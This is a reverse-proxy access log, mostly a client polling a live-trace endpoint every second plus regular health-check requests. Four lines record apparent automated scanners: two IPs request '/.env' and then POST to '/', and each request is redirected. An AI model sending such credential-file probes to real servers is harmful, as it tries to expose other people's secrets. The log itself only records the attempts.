172.58.251.170 - - [16/Dec/2023:17:38:11 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 304 "-" "-" 2978 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:12 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 304 "-" "-" 2979 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:13 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 304 "-" "-" 2980 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:14 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 306 "-" "-" 2981 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:15 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 306 "-" "-" 2982 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:16 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 306 "-" "-" 2983 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:17 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 329 "-" "-" 2984 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:18 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 329 "-" "-" 2985 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:19 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 329 "-" "-" 2986 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:20 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 331 "-" "-" 2987 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:21 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 331 "-" "-" 2988 "livetrace@docker" "http://172.29.0.3:80" 1ms
95.214.235.169 - - [16/Dec/2023:17:38:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2989 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2990 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.170 - - [16/Dec/2023:17:38:22 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2991 "livetrace@docker" "http://172.29.0.3:80" 1ms
95.214.235.169 - - [16/Dec/2023:17:38:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2992 "web-to-websecure@internal" "-" 0ms
172.58.251.170 - - [16/Dec/2023:17:38:23 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2993 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:24 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2994 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:25 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2995 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:26 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2996 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:27 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2997 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:28 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 333 "-" "-" 2998 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:29 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 399 "-" "-" 2999 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:30 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 399 "-" "-" 3000 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:31 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 399 "-" "-" 3001 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:32 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 422 "-" "-" 3002 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:33 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 422 "-" "-" 3003 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:34 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 422 "-" "-" 3004 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:35 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 424 "-" "-" 3005 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3006 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.170 - - [16/Dec/2023:17:38:36 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 424 "-" "-" 3007 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:37 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 424 "-" "-" 3008 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:38 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 426 "-" "-" 3009 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:39 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 426 "-" "-" 3010 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:40 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 426 "-" "-" 3011 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:41 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 449 "-" "-" 3012 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:42 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 449 "-" "-" 3013 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:43 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 449 "-" "-" 3014 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:44 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 451 "-" "-" 3015 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:45 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 451 "-" "-" 3016 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:46 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 451 "-" "-" 3017 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:47 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 453 "-" "-" 3018 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:48 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 453 "-" "-" 3019 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:49 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 453 "-" "-" 3020 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:50 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 476 "-" "-" 3021 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:51 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 476 "-" "-" 3022 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:52 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 476 "-" "-" 3023 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:53 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 478 "-" "-" 3024 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:54 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 478 "-" "-" 3025 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:55 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 478 "-" "-" 3026 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:56 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 480 "-" "-" 3027 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:57 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 480 "-" "-" 3028 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:58 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 480 "-" "-" 3029 "livetrace@docker" "http://172.29.0.3:80" 1ms
54.37.79.75 - - [16/Dec/2023:17:38:59 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3030 "web-to-websecure@internal" "-" 0ms
172.58.251.170 - - [16/Dec/2023:17:38:59 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 503 "-" "-" 3031 "livetrace@docker" "http://172.29.0.3:80" 1ms
54.37.79.75 - - [16/Dec/2023:17:38:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3032 "web-to-websecure@internal" "-" 0ms
172.58.251.170 - - [16/Dec/2023:17:39:00 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 503 "-" "-" 3033 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:01 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 503 "-" "-" 3034 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:02 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 505 "-" "-" 3035 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:03 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 505 "-" "-" 3036 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:04 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 505 "-" "-" 3037 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:05 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 507 "-" "-" 3038 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:06 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 507 "-" "-" 3039 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:07 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 507 "-" "-" 3040 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:08 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 530 "-" "-" 3041 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:09 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 530 "-" "-" 3042 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:10 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 530 "-" "-" 3043 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:11 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 532 "-" "-" 3044 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:12 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 532 "-" "-" 3045 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:14 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 532 "-" "-" 3046 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:14 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 534 "-" "-" 3047 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:15 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 534 "-" "-" 3048 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:16 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 534 "-" "-" 3049 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:17 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 557 "-" "-" 3050 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:18 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 557 "-" "-" 3051 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:19 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 557 "-" "-" 3052 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:20 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 559 "-" "-" 3053 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:21 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 559 "-" "-" 3054 "livetrace@docker" "http://172.29.0.3:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3055 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.170 - - [16/Dec/2023:17:39:22 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 559 "-" "-" 3056 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:23 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 561 "-" "-" 3057 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:24 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 561 "-" "-" 3058 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:26 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 561 "-" "-" 3059 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:26 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 584 "-" "-" 3060 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:27 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 584 "-" "-" 3061 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:28 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 584 "-" "-" 3062 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:29 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 586 "-" "-" 3063 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:30 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 586 "-" "-" 3064 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:31 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 586 "-" "-" 3065 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:32 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 588 "-" "-" 3066 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:33 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 588 "-" "-" 3067 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:34 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 588 "-" "-" 3068 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:35 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 611 "-" "-" 3069 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3070 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.170 - - [16/Dec/2023:17:39:36 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 611 "-" "-" 3071 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:37 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 611 "-" "-" 3072 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:38 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 613 "-" "-" 3073 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:39 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 613 "-" "-" 3074 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:40 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 613 "-" "-" 3075 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:41 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 615 "-" "-" 3076 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:42 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 615 "-" "-" 3077 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:43 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 615 "-" "-" 3078 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:44 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 638 "-" "-" 3079 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:45 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 638 "-" "-" 3080 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:46 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 638 "-" "-" 3081 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:47 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 640 "-" "-" 3082 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:48 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 640 "-" "-" 3083 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:49 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 640 "-" "-" 3084 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:50 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 642 "-" "-" 3085 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:51 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 642 "-" "-" 3086 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:52 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 642 "-" "-" 3087 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:53 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 665 "-" "-" 3088 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:54 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 665 "-" "-" 3089 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:55 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 665 "-" "-" 3090 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:56 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 667 "-" "-" 3091 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:39:57 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 667 "-" "-" 3092 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:58 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 667 "-" "-" 3093 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:39:59 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 669 "-" "-" 3094 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:40:00 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 669 "-" "-" 3095 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:40:01 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 669 "-" "-" 3096 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:40:02 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 692 "-" "-" 3097 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:40:03 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 692 "-" "-" 3098 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:40:04 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 692 "-" "-" 3099 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:40:05 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 694 "-" "-" 3100 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:40:06 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 694 "-" "-" 3101 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:40:07 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 694 "-" "-" 3102 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:40:07 +0000] "GET /trace/ HTTP/2.0" 200 4054 "-" "-" 3103 "livetrace@docker" "http://172.29.0.3:80" 5005ms
159.203.109.206 - - [16/Dec/2023:17:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3104 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3105 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3106 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3107 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3108 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3109 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3110 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3111 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3112 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3113 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3114 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3115 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3116 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3117 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3118 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3119 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3120 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3121 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3122 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3123 "www@docker" "http://172.29.0.8:80" 1ms
172.58.251.98 - - [16/Dec/2023:17:50:01 +0000] "GET /trace/ HTTP/2.0" 200 4053 "-" "-" 3124 "livetrace@docker" "http://172.29.0.3:80" 5036ms
159.203.109.206 - - [16/Dec/2023:17:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3125 "www@docker" "http://172.29.0.8:80" 0ms
